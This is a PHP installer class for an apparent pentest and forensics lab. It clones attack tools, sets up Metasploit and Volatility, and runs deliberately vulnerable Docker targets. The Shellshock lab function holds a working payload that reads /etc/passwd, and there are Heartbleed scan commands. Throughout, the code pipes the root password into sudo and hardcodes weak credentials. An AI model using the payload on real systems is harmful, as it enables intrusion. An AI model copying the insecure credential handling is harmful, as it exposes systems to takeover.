<?php

/*
vncserver -geometry 5700x2050 :2 -localhost -no 
vncserver -kill :2 
 */
 
class INSTALL extends CONFIG{
	


	var $user2email ;

	var $proxy_port_web ;
	var $proxy_port_burp ;
	var $proxy_port_zap ;
	var $port_rfi ;
	var $port_shell_bind ;
	var $port_shell ;
	var $proxy_addr ;
	var $user2agent ;
	var $proxychains ;
	
	var $mysql_host;
	var $mysql_login;
	var $mysql_passwd ;
	var $mysql_base_geoip;
	var $mysql_database;
	var $faraday_workspace_name;
	var $root_passwd;


	
	function __construct() {
	    parent::__construct();
	   //$this->article("RACINE", $this->racine);
	    if (!file_exists("$this->racine/config.xml")) $this->requette("php ./install.php");

	    $config_data = simplexml_load_file("$this->racine/config.xml");
	    
	    $this->user2email = $config_data->email; 
	    $this->user2agent = $config_data->user_agent; 
	    $this->mysql_host = $config_data->mysql_host; 
	    $this->mysql_login  = $config_data->mysql_login; 
	    $this->mysql_passwd = $config_data->mysql_passwd; 
	    $this->root_passwd = $config_data->root_passwd;
	    $this->faraday_workspace_name = $config_data->faraday_workspace_name;
	    $this->proxychains = $config_data->proxychains;
	

	
	$this->proxy_port_web = 8081;
	$this->proxy_addr = "127.0.0.1";
	$this->proxy_port_burp = 8081 ;
	$this->proxy_port_zap = 8082 ;
	$this->port_rfi = 8085 ;
	$this->port_shell = 8069;
	$this->port_shell_bind = 6969;
	$this->mysql_base_geoip = "geoip";
	$this->mysql_database = "bot";
	
	

	// ###########################################################################################################
	//$this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local  $this->racine");
	}
	

	function install_add_depot_all($tab_source_dep){
		foreach($tab_source_dep as $depot)
			$this->install_add_depot($depot);
	}
	
	function install_add_depot($depot){
		$this->requette(" add-apt-repository ppa:$depot");
	}
	
	
	function donwload_all($tab_download_git,$tab_download_http,$tab_download_svn){
		foreach($tab_download_git as $git)	$this->download_git($git);
		foreach($tab_download_http as $url)	$this->download_http($url);
		foreach($tab_download_svn as $svn)	$this->download_svn($svn);
	}
	
	function download_git($git){
		// Model -> git@jittre.unfuddle.com:jittre/name.git
		$this->requette("echo '$this->root_passwd' | sudo -S git clone git://$git /opt");
	}
	
	function download_http($url){
		$this->requette("wget -c $url");
	}
	
	function download_svn($svn){
		$this->requette("svn checkout $svn");
	}
	
	
	function install_scanner(){
	    $this->titre(__FUNCTION__);
	    //$this->install_scanner_nexpose();$this->pause();
	    //$this->install_scanner_metasploit();$this->pause();
	    //$this->install_scanner_nessus();$this->pause();
	    //$this->install_scanner_openvas();$this->pause();
	    $this->install_scanner_web();$this->pause();
	    //$this->install_scanner_ssh();$this->pause();
	}
	
	public function install_scanner_web_cli_sitadel(){
	    $this->ssTitre(__FUNCTION__);
	    if(!is_dir("/opt/XAttacker")) {
	        $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/shenril/Sitadel.git /opt/Sitadel");
	        $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/Sitadel");
	        $this->requette("cd /opt/Sitadel; pip3 install . ");
	        $this->requette("cd /opt/Sitadel; python3 sitadel.py --help ");
	    }
	}
	
	public function install_scanner_web_cli_XAttacker(){
	    $this->ssTitre(__FUNCTION__);
	    if(!is_dir("/opt/XAttacker")) {
	        $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/Moham3dRiahi/XAttacker.git /opt/XAttacker");
	        $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/XAttacker");
	        $this->requette("cd /opt/XAttacker; perl XAttacker.pl -h ");
	    }
	}
	
	
	public function install_scanner_web_cli_vbscan(){
	    $this->ssTitre(__FUNCTION__);
	    if(!is_dir("/opt/vbscan")) {
	        $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/rezasp/vbscan.git /opt/vbscan");
	        $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/vbscan");
	        $this->requette("cd /opt/vbscan; perl vbscan.pl -h ");
	    }
	}
	
	public function install_scanner_web_cli_cmseek(){
	    $this->ssTitre(__FUNCTION__);
	    if(!is_dir("/opt/CMSeek")) {
	        $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/Tuhinshubhra/CMSeeK.git /opt/CMSeeK");
	        $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/CMSeeK");
	        $this->requette("cd /opt/CMSeeK; python3 cmseek.py -h ");
	    }
	}
	
	public function install_scanner_web_cli_sqlmap(){
	    $this->ssTitre(__FUNCTION__);
	    if(!is_dir("/opt/sqlmap")) {
	        $this->requette("echo '$this->root_passwd' | sudo -S git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git /opt/sqlmap");
	        $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/sqlmap");
	        $this->requette("cd /opt/sqlmap; python sqlmap.py -h ");
	    }
	}
	
	public function install_labs_sip(){
	    
	    $this->ssTitre(__FUNCTION__);
	    if(!is_dir("/opt/sipvicious-master")) {
	        $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/EnableSecurity/sipvicious.git /opt/sipvicious-master ");
	        $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/sipvicious-master ");
	        $this->requette("cd /opt/sipvicious-master/sipvicious/; sudo -H python setup.py install ");
	    }
	}
	
	function install_scanner_nexpose(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("chmod +x $this->dir_install/localhost/Rapid7Setup-Linux64.bin");
		
		$this->requette("echo '$this->root_passwd' | sudo -S $this->dir_install/localhost/Rapid7Setup-Linux64.bin");
	}
	
	function install_scanner_openvas(){
	    $this->ssTitre(__FUNCTION__);
	    $this->requette("echo '$this->root_passwd' | sudo -S apt install -y openvas");
	    $this->requette("echo '$this->root_passwd' | sudo -S openvas-setup");
	    $this->requette("echo '$this->root_passwd' | sudo -S netstat -antp | grep -E \"(openvas|gsad)\" ");
	    $this->requette("echo '$this->root_passwd' | sudo -S openvas-start");
	    
	    $this->requette("echo '$this->root_passwd' | sudo -S greenbone-nvt-sync");
	    $this->requette("echo '$this->root_passwd' | sudo -S greenbone-scapdata-sync");
	    $this->requette("echo '$this->root_passwd' | sudo -S greenbone-certdata-sync");
	    
	    $this->requette("echo '$this->root_passwd' | sudo -S openvassd");
	    $this->requette("echo '$this->root_passwd' | sudo -S openvasmd");
	    $this->requette("echo '$this->root_passwd' | sudo -S openvas-check-setup");
	    $this->requette("echo '$this->root_passwd' | sudo -S openvas-setup");
	    $this->requette("echo '$this->root_passwd' | sudo -S openvasmd --rebuild --progress");
	    $this->requette("echo '$this->root_passwd' | sudo -S openvas-check-setup");
	    $this->requette("echo '$this->root_passwd' | sudo -S openvasmd --create-user=$this->mysql_login");
	    $this->requette("echo '$this->root_passwd' | sudo -S openvasmd --get-users");
	    $this->requette("echo '$this->root_passwd' | sudo -S openvasmd --user=rohff --new-password=hacker");
	    $this->requette("echo '$this->root_passwd' | sudo -S openvas-start");
	    $this->requette("echo '$this->root_passwd' | sudo -S ss -ant | grep ':939' ");
	}
	
	function install_scanner_metasploit(){
	    $this->ssTitre(__FUNCTION__);
	  $dir_search = "/opt/metasploit-framework";
	  if(!is_dir($dir_search)) {
	      $this->requette("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall && chmod 755 /tmp/msfinstall && echo '$this->root_passwd' | sudo -S /tmp/msfinstall");
	      $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:root -R $dir_search ");
	       $this->requette("echo '$this->root_passwd' | sudo -S chmod 770 -R $dir_search ");
	       $this->requette("cd $dir_search; bundle install");
	       $this->requette("echo '$this->root_passwd' | sudo -S $dir_search/msfupdate ");
	       
	    }
	  }
	
	  public function install_labs_windows_kernel_exploits(){
	      $this->ssTitre(__FUNCTION__);
	          $dir_search = "/opt/windows-kernel-exploits";
	          if(!is_dir($dir_search)) {
	          $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/SecWiki/windows-kernel-exploits.git $dir_search ");
	          $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R $dir_search ");
	      }
	  }
	  
	  public function install_labs_windows_exploit_suggester(){
	      $this->ssTitre(__FUNCTION__);	      
	      $dir_search = "/opt/Windows-Exploit-Suggester";
	      if(!is_dir($dir_search)) {
	          $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/AonCyberLabs/Windows-Exploit-Suggester.git $dir_search ");
	          $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R $dir_search ");
	          $this->requette("cd $dir_search; python ./windows-exploit-suggester.py --update");
	          
	      }
	  }
	
	  public function install_labs_windows_exploit_suggester_ng(){
	      $this->ssTitre(__FUNCTION__);
	      $dir_search = "/opt/wesng";
	      if(!is_dir($dir_search)) {
	          $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/bitsadmin/wesng.git $dir_search ");
	          $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R $dir_search ");
	      }
	  }
	  
	function install_scanner_nessus(){
	    $this->ssTitre(__FUNCTION__);
		    $this->requette("echo '$this->root_passwd' | sudo -S dpkg -i $this->dir_install/localhost/Nessus-7.1.0-ubuntu1110_amd64.deb");
	}
	
	
	function install_for_volatility_plugins_linux(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("echo '$this->root_passwd' | sudo -S cp -v $this->dir_install/Plugins_Volatility/Linux/*.py /opt/volatility/volatility/plugins/overlays/linux");
	}
	
	function install_for_volatility_plugins_Mac(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("echo '$this->root_passwd' | sudo -S cp -v $this->dir_install/Plugins_Volatility/Mac/*.py /opt/volatility/volatility/plugins/overlays/mac");
	}
	
	
	function install_for_volatility_plugins_win(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("echo '$this->root_passwd' | sudo -S cp -v $this->dir_install/Plugins_Volatility/Win/*.py /opt/volatility/volatility/plugins");
	}
	
	function install_for_volatility(){


	    
		$this->ssTitre("Install Volatility");
		if(!is_dir("/opt/volatility/")) {
		    $this->ssTitre("Install Volatility dependencies");
		    $this->requette(" echo '$this->root_passwd' | sudo -S apt-get install subversion pcregrep libpcre++-dev python-dev libelf-dev -y");
		    $this->ssTitre("Installing Pycrypto");
		    $this->requette("echo '$this->root_passwd' | sudo -S -H pip install pycrypto --upgrade");
		    $this->ssTitre("Installing Distorm3");
		    $this->requette("echo '$this->root_passwd' | sudo -S -H pip install distorm3 --upgrade");
			$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/volatilityfoundation/volatility.git /opt/volatility ");
			$this->requette("tree /opt/volatility ");
			$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/volatility");
			$this->requette("cd /opt/volatility; python setup.py build;echo '$this->root_passwd' | sudo -S python setup.py install");
			$this->pause();

		}
		//$this->install_for_volatility_plugins_linux();
		//$this->install_for_volatility_plugins_Mac();
		//$this->install_for_volatility_plugins_win();
		

	}
	
	
	
	
	function install_for_sandbox_win($vm){
		$this->ssTitre(__FUNCTION__);
		//$vm_obj = new vm($vm);
		$this->requette("zip $this->dir_install/Win/for/* -d $this->dir_tmp/Forensics.zip");
		//$vm_obj->vm2upload("$this->dir_tmp/Forensics.zip", "$this->vm_tmp_win/Forensics.zip");
	}
	
	function install_for_sandbox_linux(){
		$this->ssTitre(__FUNCTION__);
		$this->install_for_sandbox_linux4inetsim();
	}
	
	function install_for_sandbox_linux4inetsim(){
		$this->ssTitre(__FUNCTION__);
		if (!file_exists("/opt/inetsim-1.2.6/inetsim")) {
			$this->requette("echo '$this->root_passwd' | sudo -S tar -xvf $this->dir_install/localhost/inetsim-1.2.6.tar.gz -C /opt");
			$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/inetsim-1.2.6");
			$this->requette("echo '$this->root_passwd' | sudo -S bash /opt/inetsim-1.2.6/setup.sh");
			$this->requette("grep -n \"http_bind_port\" /etc/inetsim/inetsim.conf");
			$this->note("add http_bind_port 8080 to /etc/inetsim/inetsim.conf");
			$this->requette("echo '$this->root_passwd' | sudo -S gedit /etc/inetsim/inetsim.conf");
			$this->requette("echo '$this->root_passwd' | sudo -S gedit inetsim ");
	
		}
		$this->pause();
	}
	

	
	
	function install_maltego(){
		$this->ssTitre("Install Maltego");
		$this->net("https://www.paterva.com/web6/products/download4.php");
		$this->requette("echo '$this->root_passwd' | sudo -S dpkg -i $this->dir_tools/sandbox/MaltegoCarbonCE.v3.5.3.deb");
		$this->pause();
		$this->install_maltego_features();$this->pause();
		$this->install_maltego_sploitego();$this->pause();
	}
	
	function install_maltego_features(){
		$this->requette("echo '$this->root_passwd' | sudo -S  pip install setuptools");
		$this->requette(" easyinstall canari");
	}

	function install_maltego_sploitego(){
		$this->titre("Install Sploitego Features");
		$this->ssTitre("Install Amap");
		$this->net("https://www.thc.org/download.php?t=r&f=amap-5.4.tar.gz");
		$this->requette("echo '$this->root_passwd' | sudo -S tar -xvf $this->dir_tools/sandbox/amap-5.4.tar.gz -C /opt/");
		$this->requette("cd /opt/amap-5.4; ./configure");
		$this->requette("cd /opt/amap-5.4;make ");
		$this->requette("cd /opt/amap-5.4;echo '$this->root_passwd' | sudo -S make install ");
		$this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local /opt/amap-5.4");
	$this->pause();
		$this->ssTitre("Install Sploitego");
		$this->requette("echo '$this->root_passwd' | sudo -S unzip $this->dir_tools/sandbox/sploitego.zip -d /opt/");
		$this->requette("echo '$this->root_passwd' | sudo -S mv -v /opt/sploitego-master /opt/sploitego");
		$this->requette("cd /opt/sploitego/;echo '$this->root_passwd' | sudo -S  python setup.py install");
		$this->requette("cd ~; canari create-profile sploitego");
		$this->pause();
	}
	
	
	function install_for_sandbox_maltego(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("echo '$this->root_passwd' | sudo -S dpkg -i $this->dir_install/localhost/MaltegoCE.v4.0.11.9358.deb");
		$this->requette("cd /opt/; echo '$this->root_passwd' | sudo -S git clone https://github.com/bostonlink/cuckooforcanari.git cuckooforcanari");
		$this->requette("cd /opt/cuckooforcanari ;echo '$this->root_passwd' | sudo -S python setup.py install");
		$this->requette("cd ~;canari create-profile cuckooforcanari");
		$this->requette("echo '$this->root_passwd' | sudo -S chown -R $this->user2local:$this->user2local /opt/cuckooforcanari");
		$this->requette("mkdir /opt/cuckoo/malware");
		$this->requette("gedit ~/.canari/cuckooforcanari.conf");
	
		$this->requette("ls -al ~/*.mtz");
		$this->note("import configuration MTZ into maltego");
		$this->cmd("localhost","/opt/cuckoo/utils/api.py ");
		$this->pause();
	}
	
	
	

	
	
	function install_exploit_exploitdb_update(){
		$this->ssTitre(__FUNCTION__);
		$this->net("http://www.exploit-db.com/");
		$this->requette("wget http://www.exploit-db.com/archive.tar.bz2 -O $this->dir_tmp/exploitdb.tar.bz2");
		$this->requette("tar -xjvf $this->dir_tmp/exploitdb.tar.bz2 ");
		$this->requette("echo '$this->root_passwd' | sudo -S mv -v $this->dir_tmp/exploitdb/file.csv /opt/exploitdb/");
		$this->pause();
	}
	


	function install4ub(){
	    $this->gtitre(__FUNCTION__);
	    
	    $this->ssTitre("Upgrade on Host");$this->update_dep();$this->pause();
	    $this->install_soft();$this->pause();
		$this->install_labs();$this->pause();
		$this->install_scanner();$this->pause();
		$this->ssTitre("Upgrade on Host");$this->update_dep();$this->pause();
		$this->install_malware();$this->pause();
		$this->install_bof();$this->pause();
		 
		 
		$this->install_exploit();$this->pause();
		$this->install_for();$this->pause();
		$this->ssTitre("Upgrade on Host");$this->update_dep();$this->pause();		
	}
	
	

	
	public function install_labs_web(){
	    $this->titre(__FUNCTION__);
	    $this->install_labs_web_dsvw();$this->pause();
	    $this->install_labs_web_beef();$this->pause();
	    $this->install_labs_web_dvwa();$this->pause();
	    $this->install_labs_web_dvws();$this->pause();
	    $this->install_labs_web_hackazon();$this->pause();
	    $this->install_labs_web_mutillidae();$this->pause();
	    $this->install_labs_web_openssl();$this->pause();
	    $this->install_labs_web_owasp();$this->pause();
	    $this->install_labs_web_shellshock();$this->pause();
	    $this->install_labs_web_webgoat();$this->pause();
	    $this->install_labs_web_xvwa();$this->pause();
	    $this->install_labs_web_sqli();$this->pause();
	}
	
	function install_labs_web_beef(){
		$this->ssTitre(__FUNCTION__);
		$this->requette("cd /opt/ ; echo '$this->root_passwd' | sudo -S git clone https://github.com/beefproject/beef");
		$this->requette(" echo '$this->root_passwd' | sudo -S apt-get install -y git-core curl zlib1g-dev build-essential libssl-dev libreadline-dev libyaml-dev libsqlite3-dev sqlite3 libxml2-dev libxslt1-dev libcurl4-openssl-dev python-software-properties libffi-dev");
		$this->requette("cd ~; git clone https://github.com/sstephenson/rbenv.git ~/.rbenv");
		$this->requette("cd ~; echo 'export PATH=\"\$HOME/.rbenv/bin:\$PATH\"' >> ~/.bashrc");
		$this->requette("cd ~; echo 'eval \"\$(rbenv init -)\"' >> ~/.bashrc");
		$this->requette("git clone https://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build");
		$this->requette("echo 'export PATH=\"\$HOME/.rbenv/plugins/ruby-build/bin:\$PATH\"' >> ~/.bashrc");
		$this->cmd("localhost","source ~/.bashrc");$this->pause();
		$this->requette("rbenv install 2.3.1");
		$this->requette("rbenv global 2.3.1");
		$this->requette("rvm 2.3.1 --default");
		$this->requette("ruby -v ");
		$this->article("change", "Move file beef.rb to msf/plugins and lib/beef to msf/lib");
		$this->article("Install", "cd /opt/beef/ ; bundle install");
		$this->article("Update", "cd /opt/beef/ ; ./update-beef");
		$this->pause ();
		$this->ssTitre("Config beef with metasploit");
		$this->net("https://github.com/beefproject/beef/blob/master/extensions/metasploit/config.yaml");
		$this->cmd("localhost", "git clone https://github.com/xntrik/beefmetasploitplugin.git ");
		$this->cmd("msf>", "load msgrpc ServerHost=127.0.0.1 Pass=abc123");
		$this->requette("cd /opt/beef/ ; ./beef -h");
		$this->cmd("localhost", "cd /opt/beef/; ./beef -v -c ./config.yaml");
		$this->pause ();
	
	}
	

	function install_for_remnux(){
		// https://remnux.org/docs/containers/malware-analysis/
		// https://remnux.org/docs/containers/run-apps/
	}
	function install_labs_web_dvwa(){ // No 
		$this->ssTitre(__FUNCTION__);
		$this->cmd("DOWNLOAD Container","echo '$this->root_passwd' | sudo -S docker pull infoslack/dvwa");
		$this->cmd("RUN Container","echo '$this->root_passwd' | sudo -S docker run --name dvwa -d -p 9082:80 infoslack/dvwa");
		$this->net("http://localhost:9082/dvwa");
		$this->cmd("LIST Container","echo '$this->root_passwd' | sudo -S  docker container ps");
		$this->cmd("STOP Container","echo '$this->root_passwd' | sudo -S  docker container stop dvwa");
		$this->cmd("RESTART Container","echo '$this->root_passwd' | sudo -S  docker start dvwa");

		
	}
	function install_labs_web_owasp(){ // No 
		$this->ssTitre(__FUNCTION__);
		// https://github.com/snoopysecurity/dvws
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S  docker pull vulnerables/web-owasp");
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S  docker run --name owasp -d -p 9083:80 vulnerables/web-owasp");
		$this->net("http://localhost:9083/");
	}
	
	function install_labs_web_dsvw(){ // No 
		$this->ssTitre(__FUNCTION__);
		// https://blog.appsecco.com/damn-small-vulnerable-web-in-docker-fd850ee129d5
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S  docker pull appsecco/dsvw");
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S  docker run --name dsvw -d -p 9081:80 appsecco/dsvw");
		$this->net("http://localhost:9081/");
	} 
	
	function install_labs_web_sqli(){ // OK 
		$this->ssTitre(__FUNCTION__);
		// //https://github.com/Audi-1/sqli-labs
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S  docker pull tuxotron/audi_sqli");
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S  docker run --name sqli -d -p 9084:80 tuxotron/audi_sqli");
		$this->net("http://localhost:9084/");
	}
	
	

	function install_labs_web_hackazon(){ // No 
		$this->ssTitre(__FUNCTION__);
		// https://github.com/snoopysecurity/dvws
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S  docker pull pierrickv/hackazon");
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S  docker run --name hackazon -d -p 9085:80 pierrickv/hackazon");
		$this->net("http://localhost:9085/");
	}
	
	function install_labs_web_dvws(){ // No 
		$this->ssTitre(__FUNCTION__);
		// https://github.com/snoopysecurity/dvws
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S  docker pull cyrivs89/web-dvws");
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S  docker run --name dvws -d -p 9086:80 cyrivs89/web-dvws");
		$this->net("http://localhost:9086/");
	}
	
	public function install_scanner_web_cli_xss(){
	    $this->ssTitre(__FUNCTION__);
	    $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/s0md3v/XSStrike.git /opt/XSStrike");
	    $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/XSStrike");
	    $this->requette("cd /opt/XSStrike; pip3 install -r requirements.txt");
	    $this->requette("cd /opt/XSStrike; python3 xsstrike.py ");
	    
	}
	
	public function install_scanner_ssh(){
	    $this->ssTitre(__FUNCTION__);
	    $this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/leapsecurity/libssh-scanner.git /opt/libssh-scanner");
	    $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/libssh-scanner");
	    $this->requette("cd /opt/libssh-scanner; pip3 install -r requirements.txt");
	    $this->requette("cd /opt/libssh-scanner; python3 libsshscan.py ");
	    
	}
	
	function install_labs_web_xvwa(){ // OK 
		$this->ssTitre(__FUNCTION__);
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S  docker pull tuxotron/xvwa");
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S  docker run --name xvwa -d -p 9087:80 tuxotron/xvwa");
		$this->net("http://localhost:9087/");
	}
	
	function install_labs_web_openssl(){ // No 
		$this->ssTitre(__FUNCTION__);
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S  docker pull hmlio/vaas-cve-2014-0160");
		$this->cmd("localhost","docker run -d -p 9088:80 -p 9043:443 --name openssl hmlio/vaas-cve-2014-0160");

		$this->cmd("localhost","nmap -sV -p 80 --script=ssl-heartbleed <IP>");
		$this->cmd("localhost","msfcli auxiliary/scanner/ssl/openssl_heartbleed RHOSTS=your-ip RPORT=80 VERBOSE=true E");
		$this->net("http://localhost:9088/");
		$this->net("https://localhost:9043/");
	}
	
	function install_labs_web_webgoat(){ // No 
		$this->ssTitre(__FUNCTION__);
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S  docker pull danmx/docker-owasp-webgoat");
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S docker run -p 9089:8080 --name webgoat -it danmx/docker-owasp-webgoat");
		$this->net("http://localhost:9089/");
	}
	
	function install_labs_web_shellshock(){ // No 
		$this->ssTitre(__FUNCTION__);
		$this->article("CVE 2014-6271","
A Debian (Wheezy) Linux system with a vulnerable version of bash and a web application to showcase CVS-2014-6271, a.k.a. Shellshock.
Overview
This docker container is based on Debian Wheezy and has been modified to use a vulernable version of Bash (bash_4.2:2b:dfsg-0.1).
A web application is available via Apache 2 and serves a CGI script which runs shell commands.");
		$this->requette("docker pull hmlio/vaas-cve-2014-6271");
		$this->cmd("localhost","docker run -d -p 9090:80 hmlio/vaas-cve-2014-6271");
		$this->net("http://localhost:9090/");
		$this->cmd("localhost","wget -qO- -U \"() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd;'\" http://$this->prof:$this->proxy_port_burp/cgi-bin/stats");
}
	
	function install_labs_web_mutillidae(){  // No 
		$this->ssTitre(__FUNCTION__);
		$this->cmd("localhost","docker run -d -p 9091:80 -p 9044:443 --name owasp17 bltsec/mutillidae-docker");
		$this->net("http://localhost:9091/");
		$this->net("https://localhost:9044/");
	}
	
	
	function install_labs_phpmyadmin() {
	    $phpconfig =<<<CONF
<Directory "/usr/share/phpmyadmin">
  Order Deny,Allow
  Deny from all
  Allow from localhost
  Allow from 127.0.0.1
</Directory>

Alias /phpmyadmin /usr/share/phpmyadmin
Alias /phpMyAdmin /usr/share/phpmyadmin
CONF;
	    $file_path_phpmyadmin = "/usr/share/phpmyadmin";
	    if(!is_dir($file_path_phpmyadmin)) {
	        $this->requette( "echo '$this->root_passwd' | sudo -S git clone https://github.com/phpmyadmin/phpmyadmin.git /usr/share/phpmyadmin ");$this->pause();
	        $this->requette( "echo '$this->root_passwd' | sudo -S echo '$phpconfig' | tee /etc/apache2/conf-available/phpmyadmin.conf");$this->pause();
	        $this->requette( "echo '$this->root_passwd' | sudo -S ln -s /usr/share/phpmyadmin /var/www/html/phpmyadmin");$this->pause();
	        $this->requette( "echo '$this->root_passwd' | sudo -S a2enconf /etc/apache2/conf-available/phpmyadmin.conf");$this->pause();
	        $this->requette( "echo '$this->root_passwd' | sudo -S composer update");$this->pause();
	        $this->requette( "echo '$this->root_passwd' | sudo -S chown www-data:www-data -R /usr/share/phpmyadmin");$this->pause();	        
	        $this->requette( "echo '$this->root_passwd' | sudo -S chmod 755 -R /usr/share/phpmyadmin");$this->pause();
	        
	        $this->requette( "echo '$this->root_passwd' | sudo -S service apache2 start");$this->pause();
	        $this->requette( "echo '$this->root_passwd' | sudo -S service apache2 reload");$this->pause();
	    }
	}
	
	function install_labs_metasm() {
	    $file_path_metasm = "/opt/metasm-master/metasm.rb";
	    $this->requette("locate metasm.rb");
	    if(! file_exists($file_path_metasm)) {
			//$this->net( "https://github.com/jjyg/metasm");
			//$this->requette( "wget -c https://github.com/jjyg/metasm/archive/master.zip -O /tmp/metasm.zip ");
			$this->requette( "echo '$this->root_passwd' | sudo -S git clone https://github.com/jjyg/metasm.git /opt/metasm-master ");$this->pause();						
			$this->requette( "echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/metasm-master ");$this->pause();
			$this->requette( "export RUBYLIB='/opt/metasm-master/metasm'");$this->pause();
			$this->requette( "echo \"RUBYLIB=\$RUBYLIB:/opt/metasm-master/metasm\" > ~/.bash_profile");$this->pause();
			$this->requette( "ruby -r metasm -e 'p Metasm::VERSION'");$this->pause();
		}
	}
	
	function install_labs_frageroute(){
	    $this->ssTitre(__FUNCTION__);
	    $dir_search = "/opt/fragroute-1.2";
	    if(!is_dir($dir_search))
	    {
	        //$this->net("http://www.monkey.org/~dugsong/fragroute/fragroute-1.2.tar.gz");
	        $this->requette("echo '$this->root_passwd' | sudo -S tar -xvzf $this->dir_install/localhost/fragroute-1.2.tar.gz -C /opt/");
	        $this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R $dir_search");
	    }
	}
	
	function install_scanner_web_gui_owtf(){
		$this->ssTitre(__FUNCTION__);
		$this->requette(" echo '$this->root_passwd' | sudo -S apt-get install -y postgresql postgresql-contrib");
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S -u postgres createuser --interactive");
		$this->cmd("localhost","echo '$this->root_passwd' | sudo -S -u postgres createdb owtfdb");
		$this->cmd("localhost","psql -d owtfdb");
		$this->cmd("localhost","ALTER USER $this->mysql_login WITH ENCRYPTED PASSWORD '$this->mysql_passwd';");
		$this->cmd("localhost","\q");
		$this->cmd("localhost","psql -d owtfdb -U $this->mysql_login");$this->pause();
		$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/owtf/owtf.git /opt/owtf ");
		$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/owtf");
		$this->requette("gedit /opt/owtf/owtf/settings.py");$this->pause();
		$this->article("config","
DATABASE_PORT: 5432
DATABASE_NAME: owtf_db
DATABASE_USER: owtf_user
DATABASE_PASS: hacker");		
		$this->requette("cd /opt/owtf;echo '$this->root_passwd' | sudo -S -H python3 setup.py develop");
		$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/owtf");
		$this->pause();
		$this->requette("gedit /opt/owtf/db.cfg");$this->pause();
	}
	
	
	function install_exploit_automater(){
		$this->ssTitre(__FUNCTION__);
		if(!is_dir("/opt/automater"))
		{
		$this->requette("echo '$this->root_passwd' | sudo -S mkdir /opt/automater");
		$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/1aN0rmus/TekDefense-Automater.git /opt/automater");
		$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/automater");
		}
	}
	
	function install_scanner_web_gui_arachni(){
		$this->ssTitre(__FUNCTION__);
		
		$this->article("login/pass","admin@admin.admin/administrator");
		if(!is_dir("/opt/arachni-master"))
		{
			//$this->requette("echo '$this->root_passwd' | sudo -S tar -xvzf $this->dir_install/web/arachni-master-linux-x86_64.tar.gz -C /opt/");
			$this->requette("echo '$this->root_passwd' | sudo -S git clone https://github.com/Arachni/arachni.git /opt/arachni ");
			$this->requette("echo '$this->root_passwd' | sudo -S chown $this->user2local:$this->user2local -R /opt/arachni-master");
			$this->ssTitre("config with postgres");
			$this->requette("cp -v /opt/arachni-master/system/arachni-ui-web/config/database.yml /opt/arachni-master/system/arachni-ui-web/config/database.yml.bak");
			$this->cmd("localhost","echo '$this->root_passwd' | sudo -S adduser postgres ");
			$this->requette("echo '$this->root_passwd' | sudo -S apt install -y postgresql-client-common");
			$this->cmd("localhost","echo '$this->root_passwd' | sudo -S -su postgres createuser owtf_user");
